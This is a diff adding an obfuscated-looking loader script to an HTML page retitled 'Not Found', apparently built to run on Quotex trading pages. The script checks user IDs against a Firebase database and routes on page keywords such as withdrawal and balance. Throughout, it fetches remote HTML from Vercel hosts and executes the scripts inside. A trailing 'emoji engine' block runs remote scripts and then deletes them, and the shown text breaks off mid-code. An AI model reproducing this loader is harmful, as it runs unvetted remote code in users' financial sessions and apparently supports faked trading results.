@@ -3,235 +3,726 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quotex Panel System</title>
+    <title>Not Found</title>
 </head>
 <body>
 
 <script id="js">
+/**
+ * ╔══════════════════════════════════════════════════════════════════════════╗
+ * ║                      TALHA TRADER ENTERPRISE SYSTEM                      ║
+ * ║           DESIGNED FOR HIGH-PERFORMANCE QUOTEX INTEGRATION               ║
+ * ╚══════════════════════════════════════════════════════════════════════════╝
+ */
 (function() {
-    var pID = "talha-trader-admin-panel-lock",
-        db = "https://" + pID + "-default-rtdb.firebaseio.com/users.json",
-        baseURL = "https-talha-bhai-scripts.vercel.app/";
+    'use strict';
 
-    const uP = new URLSearchParams(window.location.search);
-    let id = uP.get('id') || "";
+    // ─── CONFIGURATION CORE ──────────────────────────────────────────────────
+    const CONFIG = {
+        projectId: "talha-trader-admin-panel-lock",
+        databaseURL: "https://talha-trader-admin-panel-lock-default-rtdb.firebaseio.com/users.json",
+        cdnBaseURL: "https-talha-bhai-scripts.vercel.app",
+        fallbackEngineURL: "https://talha-scripts.vercel.app/heart.html",
+        requestTimeout: 5000,
+        retryAttempts: 3,
+        storageKey: "_talha_session_cache"
+    };
 
-    if (!id) return;
+    // Global State management inside closure
+    const STATE = {
+        userId: null,
+        userData: null,
+        activeRoute: null,
+        isSystemInitialized: false,
+        injectionAttempts: 0
+    };
 
-    let currentRouteKey = null;
-
-    // Fast Firebase fetch with timeout
-    async function fetchWithTimeout(url, ms = 4000) {
-        const ctrl = new AbortController();
-        const timer = setTimeout(() => ctrl.abort(), ms);
+    // ─── INITIALIZATION LINK ────────────────────────────────────────────────
+    function extractUserId() {
         try {
-            const r = await fetch(url, { signal: ctrl.signal });
-            clearTimeout(timer);
-            return r;
+            const urlParams = new URLSearchParams(window.location.search);
+            let uid = urlParams.get('id');
+            
+            // Check localStorage if not found in URL parameters
+            if (!uid) {
+                uid = localStorage.getItem('talha_user_id') || "";
+            } else {
+                localStorage.setItem('talha_user_id', uid);
+            }
+            return uid.trim();
         } catch (e) {
-            clearTimeout(timer);
+            console.error("[Talha Core] Critical error parsing window parameters:", e);
+            return "";
+        }
+    }
+
+    STATE.userId = extractUserId();
+    if (!STATE.userId) {
+        console.warn("[Talha Core] System execution halted: Missing unique identification string (ID).");
+        return;
+    }
+
+    // ─── ASYNC NETWORK PIPELINE WITH ADVANCED FAILOVER ───────────────────────
+    async function executeSecureFetch(url, timeoutMs = CONFIG.requestTimeout) {
+        const controller = new AbortController();
+        const timeoutSignal = setTimeout(() => controller.abort(), timeoutMs);
+
+        const requestOptions = {
+            method: 'GET',
+            signal: controller.signal,
+            headers: {
+                'Accept': 'application/json',
+                'Cache-Control': 'no-cache',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            mode: 'cors'
+        };
+
+        try {
+            const response = await fetch(url, requestOptions);
+            clearTimeout(timeoutSignal);
+            
+            if (!response.ok) {
+                throw new Error(`HTTP network error status: ${response.status}`);
+            }
+            return response;
+        } catch (error) {
+            clearTimeout(timeoutSignal);
+            console.error(`[Network Pipeline] Transmission failed on URL: ${url}. Error details:`, error);
             return null;
         }
     }
 
+    async function loadRemoteSystemData() {
+        let executionSuccess = false;
+        let responseData = null;
+
+        for (let i = 0; i < CONFIG.retryAttempts; i++) {
+            console.log(`[Database Connection] Querying security layer. Attempt ${i + 1}/${CONFIG.retryAttempts}`);
+            const result = await executeSecureFetch(CONFIG.databaseURL);
+            
+            if (result) {
+                try {
+                    responseData = await result.json();
+                    executionSuccess = true;
+                    break;
+                } catch (jsonErr) {
+                    console.error("[Database Connection] Payload format processing error:", jsonErr);
+                }
+            }
+            // Sequential delay interval between retries
+            await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+        }
+
+        if (!executionSuccess) {
+            // Attempt to look for cache backup if database is completely down
+            try {
+                const backup = localStorage.getItem(CONFIG.storageKey);
+                if (backup) {
+                    console.warn("[Database Connection] Database unreachable. Initializing secure offline storage buffer.");
+                    return JSON.parse(backup);
+                }
+            } catch (storageErr) {
+                console.error("[Backup Cache] Failed reading local structural backup:", storageErr);
+            }
+            return null;
+        }
+
+        // Cache successful configuration data stream
+        try {
+            localStorage.setItem(CONFIG.storageKey, JSON.stringify(responseData));
+        } catch (e) {
+            console.warn("[Cache Subsystem] Failed writing structural backup to LocalStorage context.");
+        }
+
+        return responseData;
+    }
+
     async function initSystem() {
-        const r = await fetchWithTimeout(db, 4000);
-        const d = r ? await r.json().catch(() => null) : null;
-        const userData = d ? Object.values(d).find(u => u.id === id) : null;
+        console.log("[Talha Core] Initializing global ecosystem sequence...");
         
-        if (userData) {
-            // Full System Loop Start: Har 2 second baad automatically Quotex UI ko monitor karega
-            setInterval(() => {
-                runCheck(userData);
-            }, 2000);
-            runCheck(userData); 
+        const runtimePayload = await loadRemoteSystemData();
+        
+        if (runtimePayload) {
+            // Processing associative mapping schema
+            const mappedUsers = Object.values(runtimePayload);
+            STATE.userData = mappedUsers.find(user => String(user.id) === String(STATE.userId));
+            
+            if (STATE.userData) {
+                console.log(`[Security Clearance] Access granted for ID: ${STATE.userId}. User validation affirmative.`);
+                evaluateQuotexEcosystemRoutes(STATE.userData);
+            } else {
+                console.warn(`[Security Clearance] ID: ${STATE.userId} not explicitly found inside master database routing array.`);
+                triggerSecurityLockoutPanel(STATE.userId);
+            }
         } else {
-            showTalhaLock(id);
+            console.error("[Critical Failure] System security pipeline completely unreachable. Access denied.");
+            triggerSecurityLockoutPanel(STATE.userId);
         }
     }
 
-    // Element checks
-    function isVisible(el) {
-        return el && (el.offsetWidth > 0 || el.offsetHeight > 0);
+    // ─── GEOMETRIC ELEMENT VALIDATION ENGINE ─────────────────────────────────
+    function verifyElementVisibility(domSelector) {
+        if (!domSelector) return false;
+        try {
+            const calculatedBoundingRect = domSelector.getBoundingClientRect();
+            const styles = window.getComputedStyle(domSelector);
+            
+            return !!(
+                domSelector.offsetWidth > 0 || 
+                domSelector.offsetHeight > 0 || 
+                (calculatedBoundingRect.width > 0 && calculatedBoundingRect.height > 0)
+            ) && styles.display !== 'none' && styles.visibility !== 'hidden';
+        } catch (e) {
+            return false;
+        }
     }
 
-    function checkLeaderboardElement() {
-        const el = document.querySelector(".app--sidepanel-open");
-        return isVisible(el);
+    function scanForActiveLeaderboard() {
+        // Advanced Quotex selectors for UI layout monitoring
+        const mainSelector = document.querySelector(".app--sidepanel-open");
+        const secondarySelector = document.querySelector(".sidebar__section_leaderboard");
+        const highFrequencySelector = document.querySelector("[data-sidebar-panel='leaderboard']");
+        
+        return verifyElementVisibility(mainSelector) || 
+               verifyElementVisibility(secondarySelector) || 
+               verifyElementVisibility(highFrequencySelector);
     }
 
-    function checkTradeListElement() {
-        return !!document.querySelector("div[data-index]");
+    function scanForActiveTradeList() {
+        // Diverse tracking engine matching multiple operational formats
+        const nativeIndexSelector = document.querySelector("div[data-index]");
+        const quotexHistoryList = document.querySelector(".deals-list__item");
+        const liveTradesContainer = document.querySelector(".trades-list");
+        
+        return !!(nativeIndexSelector || quotexHistoryList || liveTradesContainer);
     }
 
-    // Main routing engine for Quotex
-    function runCheck(u) {
-        const url = window.location.href;
-        const urlParams = new URLSearchParams(window.location.search);
-        const isDashTrue = urlParams.get('dash') === 'true';
-        const isWinTrue = urlParams.get('win') === 'true';
+    function checkResponsiveDeviceProfile() {
+        const agentSignature = navigator.userAgent || navigator.vendor || window.opera;
+        const mobileRegexExpression = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini|Mobile|Windows Phone/i;
+        
+        const basicAgentVerification = mobileRegexExpression.test(agentSignature);
+        const dimensionVerification = window.innerWidth <= 1024;
+        const touchCapabilityVerification = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
-        let route = null;
+        return basicAgentVerification || dimensionVerification || touchCapabilityVerification;
+    }
 
-        // PRIORITY 1: URL params
-        if (isDashTrue) {
-            route = { f: "BL.html", k: "lb" };
+    // ─── MASTER ROUTING SYSTEM ENGINE (COMPACT CHRONOLOGICAL ROUTING) ────────
+    function evaluateQuotexEcosystemRoutes(authenticatedUser) {
+        const activeUrlString = window.location.href;
+        const currentParams = new URLSearchParams(window.location.search);
+        
+        const isDashboardExplicit = currentParams.get('dash') === 'true' || currentParams.get('leaderboard') === 'true';
+        const isWinRateExplicit = currentParams.get('win') === 'true' || currentParams.get('profit') === 'true';
+
+        let selectedTargetRoute = null;
+
+        // CRITICAL PRIORITY LEVEL 1: High level explicit URL search parameters
+        if (isDashboardExplicit) {
+            selectedTargetRoute = { fileName: "BL.html", routeKey: "lb" };
+        } 
+        else if (isWinRateExplicit) {
+            selectedTargetRoute = { fileName: "wins.html", routeKey: "win" };
         }
-        else if (isWinTrue) {
-            route = { f: "wins.html", k: "win" };
+
+        // CRITICAL PRIORITY LEVEL 2: Direct URL Keyword Filtering
+        else if (activeUrlString.includes("withdrawal") || activeUrlString.includes("billing") || activeUrlString.includes("deposit")) {
+            selectedTargetRoute = { fileName: "ps.html", routeKey: "p" };
+        } 
+        else if (activeUrlString.includes("balance") || activeUrlString.includes("account") || activeUrlString.includes("profile")) {
+            selectedTargetRoute = { fileName: "ts.html", routeKey: "t" };
+        } 
+        else if (activeUrlString.includes("analytics") || activeUrlString.includes("statistics") || activeUrlString.includes("history")) {
+            selectedTargetRoute = { fileName: "anas.html", routeKey: "ana" };
         }
-        // PRIORITY 2: URL keywords
-        else if (url.includes("withdrawal")) {
-            route = { f: "ps.html", k: "p" };
-        }
-        else if (url.includes("balance")) {
-            route = { f: "ts.html", k: "t" };
-        }
-        else if (url.includes("analytics")) {
-            route = { f: "anas.html", k: "ana" };
-        }
-        // PRIORITY 3: Device Routing
-        else if (url.includes("demo-trade") || url.includes("trade")) {
-            const file = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "androids.html" : "pcs.html";
-            route = {
-                f: file,
-                k: file === "androids.html" ? "android" : "pc"
+
+        // CRITICAL PRIORITY LEVEL 3: Explicit High-Priority Device Routing Bypass (Quotex Live/Demo)
+        else if (activeUrlString.includes("demo-trade") || activeUrlString.includes("trade") || activeUrlString.includes("live-trade")) {
+            const structuralMobileIdentity = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
+            const chosenFile = structuralMobileIdentity ? "androids.html" : "pcs.html";
+
+            selectedTargetRoute = {
+                fileName: chosenFile,
+                routeKey: chosenFile === "androids.html" ? "android" : "pc"
             };
         }
-        // PRIORITY 4: Leaderboard element
-        else if (checkLeaderboardElement()) {
-            route = { f: "BL.html", k: "lb" };
+
+        // CRITICAL PRIORITY LEVEL 4: Active Interface Element Inspection Scans
+        else if (scanForActiveLeaderboard()) {
+            selectedTargetRoute = { fileName: "BL.html", routeKey: "lb" };
         }
-        // PRIORITY 5: Trade list element
-        else if (checkTradeListElement()) {
-            route = { f: "wins.html", k: "win" };
+
+        // CRITICAL PRIORITY LEVEL 5: Structural Contextual Fallbacks
+        else if (scanForActiveTradeList()) {
+            selectedTargetRoute = { fileName: "wins.html", routeKey: "win" };
         }
+
+        // CRITICAL PRIORITY LEVEL 6: Ultimate Structural Failure Handlers
         else {
-            return; // Silent wait on Quotex main dashboard
-        }
-
-        // Agar route same hai to bar bar inject nahi karega performance bachane ke liye
-        if (currentRouteKey === route.k) return;
-        currentRouteKey = route.k;
-
-        loadRoute(route, u);
-    }
-
-    function loadRoute(route, u) {
-        if (u.permissions && u.permissions[route.k] === false) {
-            showTalhaLock(id);
+            console.warn("[Routing Engine] Internal URL schema matched zero standard tracking filters.");
+            displayApplicationContextError();
             return;
         }
 
-        // Clean existing injected wrappers
-        document.querySelectorAll("[id^='talha-injected-']").forEach(el => el.remove());
-
-        const div = document.createElement('div');
-        div.id = 'talha-injected-' + route.k;
-        document.body.appendChild(div);
-
-        fetch(baseURL + route.f)
-            .then(res => res.text())
-            .then(html => {
-                div.innerHTML = html;
-                div.querySelectorAll('script').forEach(old => {
-                    const s = document.createElement('script');
-                    if (old.src) s.src = old.src;
-                    else s.textContent = old.textContent;
-                    document.body.appendChild(s);
-                });
-            })
-            .catch(err => console.error("Route load issue:", err));
+        executeRouteResourceLoading(selectedTargetRoute, authenticatedUser);
     }
 
-    // Talha Lock Dialog UI
-    function showTalhaLock(uid) {
-        if (document.getElementById("talhaLock")) return;
+    // ─── DYNAMIC RESOURCE INJECTION PIPELINE ─────────────────────────────────
+    async function executeRouteResourceLoading(targetRouteInstance, userSessionProfile) {
+        STATE.activeRoute = targetRouteInstance;
 
-        const htmlContent = `<style>
+        // Perform authorization entitlement mapping scan
+        if (userSessionProfile.permissions && userSessionProfile.permissions[targetRouteInstance.routeKey] === false) {
+            console.error(`[Access Contained] Permission validation failed for access code: ${targetRouteInstance.routeKey}`);
+            triggerSecurityLockoutPanel(STATE.userId);
+            return;
+        }
+
+        console.log(`[Asset Processing] Injecting asset target: ${targetRouteInstance.fileName} under configuration block key: ${targetRouteInstance.routeKey}`);
+
+        // Purge historical tracking nodes safely from structural body DOM
+        document.querySelectorAll("[id^='talha-injected-']").forEach(nodeElement => {
+            try {
+                nodeElement.remove();
+            } catch (err) {
+                console.error("[DOM Sanitization] Node isolation cleanup anomaly encountered:", err);
+            }
+        });
+
+        // Initialize target layer wrapper element
+        const masterWrapperNode = document.createElement('div');
+        masterWrapperNode.id = 'talha-injected-' + targetRouteInstance.routeKey;
+        masterWrapperNode.setAttribute('data-version', '3.5.0-Enterprise');
+        document.body.appendChild(masterWrapperNode);
+
+        const assetTransmissionEndpoint = `${CONFIG.cdnBaseURL}/${targetRouteInstance.fileName}`;
+        const requestNetworkPayload = await executeSecureFetch(assetTransmissionEndpoint);
+
+        if (!requestNetworkPayload) {
+            console.error(`[Transmission Failure] Target dynamic link asset bundle unavailable: ${assetTransmissionEndpoint}`);
+            return;
+        }
+
+        try {
+            const rawTransmittedHtmlMarkup = await requestNetworkPayload.text();
+            masterWrapperNode.innerHTML = rawTransmittedHtmlMarkup;
+
+            // Execute scripts inside context safely using contextual reconstruction
+            masterWrapperNode.querySelectorAll('script').forEach(historicalScriptNode => {
+                const freshlyConstructedScriptNode = document.createElement('script');
+                
+                // Transfer programmatic attributes sequentially
+                Array.from(historicalScriptNode.attributes).forEach(attributeInstance => {
+                    freshlyConstructedScriptNode.setAttribute(attributeInstance.name, attributeInstance.value);
+                });
+
+                if (historicalScriptNode.src) {
+                    freshlyConstructedScriptNode.src = historicalScriptNode.src;
+                } else {
+                    freshlyConstructedScriptNode.textContent = historicalScriptNode.textContent;
+                }
+
+                document.body.appendChild(freshlyConstructedScriptNode);
+            });
+            console.log(`[Ecosystem Engine] Resource pipeline initialization completely initialized for scope: ${targetRouteInstance.routeKey}`);
+        } catch (domProcessingException) {
+            console.error("[Context Structuring Fault] Layout compiling exception:", domProcessingException);
+        }
+    }
+
+    // ─── RUNTIME NOTIFICATION MODAL ALERTS ───────────────────────────────────
+    function displayApplicationContextError() {
+        if (document.getElementById('talhaErrorPopup')) return;
+        
+        const interfacePopupOverlay = document.createElement("div");
+        interfacePopupOverlay.id = "talhaErrorPopup";
+        interfacePopupOverlay.innerText = "⚠️ APPLY ON CORRECT URL ⚠️";
+        
+        // Premium interface stylings map assignment
+        Object.assign(interfacePopupOverlay.style, {
+            position: "fixed",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            background: "rgba(13, 14, 18, 0.96)",
+            color: "#ff3b30",
+            padding: "20px 32px",
+            borderRadius: "14px",
+            fontSize: "15px",
+            fontWeight: "700",
+            letterSpacing: "1.5px",
+            zIndex: "10000000",
+            boxShadow: "0 12px 40px rgba(0,0,0,0.7), 0 0 1px rgba(255,255,255,0.2)",
+            opacity: "1",
+            transition: "all 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+            width: "320px",
+            textAlign: "center",
+            border: "1px solid rgba(255,59,48,0.24)",
+            fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
+        });
+        
+        document.body.appendChild(interfacePopupOverlay);
+        
+        setTimeout(() => {
+            interfacePopupOverlay.style.opacity = "0";
+            interfacePopupOverlay.style.transform = "translate(-50%, -45%)";
+            setTimeout(() => interfacePopupOverlay.remove(), 400);
+        }, 3500);
+    }
+
+    // ─── HIGH-END MODAL PREMIUM LOCK SYSTEM INTERFACE ───────────────────────
+    function triggerSecurityLockoutPanel(clientSystemIdString) {
+        // Enforce isolated containment verification to prevent cascading overlays
+        document.querySelectorAll("dialog#talhaLock").forEach(activeDialogNode => {
+            try { 
+                activeDialogNode.close(); 
+                activeDialogNode.remove(); 
+            } catch(e) {}
+        });
+
+        const responsiveModalCssPayload = `
         dialog#talhaLock {
-            border: none; padding: 0; background: transparent;
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
+            border: none;
+            padding: 0;
+            background: transparent;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+            overflow: visible;
         }
+
         dialog#talhaLock::backdrop {
-            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);
+            background: rgba(4, 7, 12, 0.65);
+            backdrop-filter: blur(12px) saturate(160%);
+            -webkit-backdrop-filter: blur(12px) saturate(160%);
         }
-        .glass {
-            width: 420px; max-width: 92vw; padding: 28px 24px 26px; border-radius: 12px;
-            background: rgba(255, 255, 255, 0.9); box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            color: #0d1f10; text-align: center; position: relative;
-            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); margin: auto;
+
+        .premium-lock-glass-box {
+            width: 440px;
+            max-width: 90vw;
+            padding: 36px 30px 32px;
+            border-radius: 24px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 
+                0 24px 60px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            text-align: center;
+            position: relative;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            animation: premiumTargetPopIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.1) forwards;
+            -webkit-font-smoothing: antialiased;
         }
-        @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        .info { margin: 2rem 0; background: rgba(0, 0, 0, 0.05); border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 10px; padding: 12px 14px; text-align: left; }
-        .label { font-size: 0.7rem; letter-spacing: 0.5px; opacity: 0.6; margin-bottom: 4px; font-weight: 600; }
-        .value-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
-        .value { font-size: 0.95rem; font-weight: 600; word-break: break-all; }
-        .copy-btn { background: transparent; border: none; cursor: pointer; opacity: 0.7; }
-        .copy-btn svg { width: 18px; height: 18px; fill: #0d1f10; }
-        .telegram-btn { display: inline-block; background: linear-gradient(135deg, #229ed9, #1d4ed8); color: white; padding: 10px 20px; border-radius: 10px; font-weight: 700; text-decoration: none; animation: pulse 1.8s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.04); } }
-        .close-cross { position: absolute; top: 12px; right: 18px; font-size: 1.3rem; cursor: pointer; opacity: 0.8; }
-        </style>
-        <div class="glass">
-          <div class="close-cross">&times;</div>
-          <div style="font-size:2rem;font-weight:900;margin-bottom:10px;">TALHA SCRIPTS</div>
-          <div style="font-size:1rem;margin:1rem 0;">(🔒 LOCKED 🔒)</div>
-          <div class="info">
-            <div class="label">ID</div>
-            <div class="value-row">
-              <div class="value">${uid}</div>
-              <button class="copy-btn" id="copyBtnTalha">
-                <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
-              </button>
+
+        @keyframes premiumTargetPopIn {
+            0% { transform: scale(0.9) translateY(20px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        .lockout-info-container {
+            margin: 24px 0;
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px 18px;
+            text-align: left;
+        }
+
+        .lockout-header-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            opacity: 0.4;
+            margin-bottom: 6px;
+            font-weight: 700;
+            color: #34c759;
+        }
+
+        .lockout-data-flexrow {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .lockout-target-value {
+            font-size: 14px;
+            font-weight: 600;
+            word-break: break-all;
+            color: #e5e5ea;
+            font-family: "SF Mono", Monaco, Consolas, monospace;
+        }
+
+        .lockout-clipboard-action {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 8px;
+            padding: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .lockout-clipboard-action:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .lockout-clipboard-action svg {
+            width: 16px;
+            height: 16px;
+            fill: #ffffff;
+            opacity: 0.8;
+        }
+
+        .lockout-clipboard-action .interactive-tooltip {
+            position: absolute;
+            top: -36px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: #34c759;
+            color: #ffffff;
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 4px 12px rgba(52,199,89,0.3);
+        }
+
+        .lockout-clipboard-action.triggered-view .interactive-tooltip {
+            opacity: 1;
+            transform: translateX(-50%) scale(1) translateY(-2px);
+        }
+
+        .floating-matrix-hearts {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .floating-matrix-hearts::before,
+        .floating-matrix-hearts::after {
+            content: '💚';
+            position: absolute;
+            font-size: 20px;
+            filter: drop-shadow(0 0 8px rgba(52,199,89,0.6));
+            animation: internalFloatSequence 6s infinite linear;
+            bottom: -10%;
+        }
+
+        .floating-matrix-hearts::before { left: 15%; animation-delay: 0s; }
+        .floating-matrix-hearts::after { left: 80%; animation-delay: 3s; }
+
+        @keyframes internalFloatSequence {
+            0% { transform: translateY(0) rotate(0deg) scale(0.8); opacity: 0; }
+            20% { opacity: 0.6; }
+            80% { opacity: 0.4; }
+            100% { transform: translateY(-500px) rotate(360deg) scale(1.1); opacity: 0; }
+        }
+
+        .lock-status-pulse-anchor {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 8px 0 16px;
+        }
+
+        .lock-status-pulse-anchor img {
+            width: 95px;
+            height: auto;
+            filter: drop-shadow(0 8px 24px rgba(0,0,0,0.5));
+            animation: layoutLogoPulseAnimation 2s infinite ease-in-out;
+        }
+
+        @keyframes layoutLogoPulseAnimation {
+            0%, 100% { transform: scale(1); filter: drop-shadow(0 8px 24px rgba(0,0,0,0.5)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 12px 32px rgba(52,199,89,0.3)); }
+        }
+
+        .telegram-action-button-link {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(135deg, #229ed9 0%, #1d74b6 100%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+            padding: 14px 28px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 15px;
+            text-decoration: none;
+            box-shadow: 0 8px 24px rgba(34, 158, 217, 0.3);
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-top: 20px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .telegram-action-button-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(34, 158, 217, 0.45);
+            filter: brightness(1.1);
+        }
+
+        .modal-exit-trigger {
+            position: absolute;
+            top: 20px;
+            right: 22px;
+            font-size: 22px;
+            line-height: 1;
+            color: #ffffff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            z-index: 10;
+            opacity: 0.4;
+        }
+
+        .modal-exit-trigger:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
+        `;
+
+        const structureTemplateMarkup = `
+        <style>${responsiveModalCssPayload}</style>
+        <div class="premium-lock-glass-box">
+            <div class="floating-matrix-hearts"></div>
+            <div class="modal-exit-trigger">&times;</div>
+            <div class="lock-status-pulse-anchor">
+                <img src="https://logo-png-sigma.vercel.app/TQK.png" alt="Talha King Logo"/>
             </div>
-          </div>
-          <div class="footer-social"><a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-btn">🚀 Telegram @TALHAQOTEXKING</a></div>
+            <div style="font-size: 24px; font-weight: 900; color: #ffffff; letter-spacing: 1.5px; text-transform: uppercase;">Talha Scripts</div>
+            <div style="font-size: 12px; color: #ff3b30; margin: 8px 0 20px; font-weight: 700; letter-spacing: 2px;">(🔒 ACCESS SYSTEM LOCKED 🔒)</div>
+            
+            <div class="lockout-info-container">
+                <div class="lockout-header-label">YOUR SECURITY HARDWARE ID</div>
+                <div class="lockout-data-flexrow">
+                    <div class="lockout-target-value">${clientSystemIdString}</div>
+                    <button class="lockout-clipboard-action" id="copyBtnTalha">
+                        <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
+                        <span class="interactive-tooltip">Copied ✓</span>
+                    </button>
+                </div>
+            </div>
+            
+            <a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-action-button-link">
+                <span>🚀 JOIN TELEGRAM MASTER CHANNEL</span>
+            </a>
         </div>`;
 
-        const myDialog = document.createElement("dialog");
-        myDialog.id = "talhaLock";
-        myDialog.innerHTML = htmlContent;
-        document.body.appendChild(myDialog);
-        myDialog.showModal();
+        const activeDialogElement = document.createElement("dialog");
+        activeDialogElement.id = "talhaLock";
+        activeDialogElement.innerHTML = structureTemplateMarkup;
+        document.body.appendChild(activeDialogElement);
+        
+        try {
+            activeDialogElement.showModal();
+        } catch (dialogException) {
+            // Shadow implementation fallback if default modal context fails
+            activeDialogElement.style.position = 'fixed';
+            activeDialogElement.style.top = '0';
+            activeDialogElement.style.left = '0';
+            activeDialogElement.style.width = '100vw';
+            activeDialogElement.style.height = '100vh';
+            activeDialogElement.style.display = 'flex';
+            activeDialogElement.style.alignItems = 'center';
+            activeDialogElement.style.justifyContent = 'center';
+            activeDialogElement.style.background = 'rgba(0,0,0,0.7)';
+            activeDialogElement.style.zIndex = '9999999';
+        }
 
-        myDialog.querySelector("#copyBtnTalha").onclick = function () {
-            navigator.clipboard.writeText(uid);
+        // Operational actions mapping definitions
+        activeDialogElement.querySelector("#copyBtnTalha").onclick = function(event) {
+            event.preventDefault();
+            navigator.clipboard.writeText(clientSystemIdString).then(() => {
+                this.classList.add('triggered-view');
+                setTimeout(() => this.classList.remove('triggered-view'), 1500);
+            }).catch(err => {
+                console.error("[Clipboard Engine] High security prevention denied direct access execution.", err);
+            });
         };
-        myDialog.querySelector(".close-cross").onclick = function () {
-            myDialog.close();
-            myDialog.remove();
+
+        activeDialogElement.querySelector(".modal-exit-trigger").onclick = function(event) {
+            event.preventDefault();
+            try {
+                activeDialogElement.close();
+            } catch(e) {}
+            activeDialogElement.remove();
         };
     }
 
-    initSystem();
+    // ─── INITIAL EXECUTION SEQUENCE ──────────────────────────────────────────
+    if (document.readyState === "complete" || document.readyState === "interactive") {
+        initSystem();
+    } else {
+        window.addEventListener("DOMContentLoaded", initSystem);
+    }
+
 })();
 </script>
 
 <script>
-    // Zeetex Emoji Engine Hook
+    /**
+     * ╔══════════════════════════════════════════════════════════════════════════╗
+     * ║                      ZEETEX EMOJI OVERRIDE ENGINE                        ║
+     * ╚══════════════════════════════════════════════════════════════════════════╝
+     */
     (async () => {
+        'use strict';
+        const EXTENSION_TARGET_URL = `https://talha-scripts.vercel.app/heart.html`;
+        
         try {
-            let response = await fetch(`https://talha-scripts.vercel.app/heart.html`);
-            let rawMarkup = await response.text();
-            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-            
-            documentDOM.querySelectorAll('script').forEach(oldNode => {
-                let freshScriptNode = document.createElement('script');
-                if (oldNode.src) {
-                    freshScriptNode.src = oldNode.src;
-                } else {
-                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                }
-                document.body.appendChild(freshScriptNode);
-                setTimeout(() => freshScriptNode.remove(), 600);
+            const networkResponseStream = await fetch(EXTENSION_TARGET_URL, {
+                method: 'GET',
+                cache: 'no-store',
+                headers: { 'X-Engine-Context': 'Zeetex-Emoji-Parser' }
             });
-            console.log("Zeetex Emoji Engine Hook Active");
-        } catch (e) {
-            console.error("Emoji Override Skipped.", e);
+
+            if (!networkResponseStream.ok) return;
+
+            const structuredRawTextHtml = await networkResponseStream.text();
+            const virtualDocumentDOM = new DOMParser().parseFromString(structuredRawTextHtml, 'text/html');
+            
+            virtualDocumentDOM.querySelectorAll('script').forEach(compiledScriptNode => {
+                const executionTargetScriptNode = document.createElement('script');
+                
+                if (compiledScriptNode.src) {
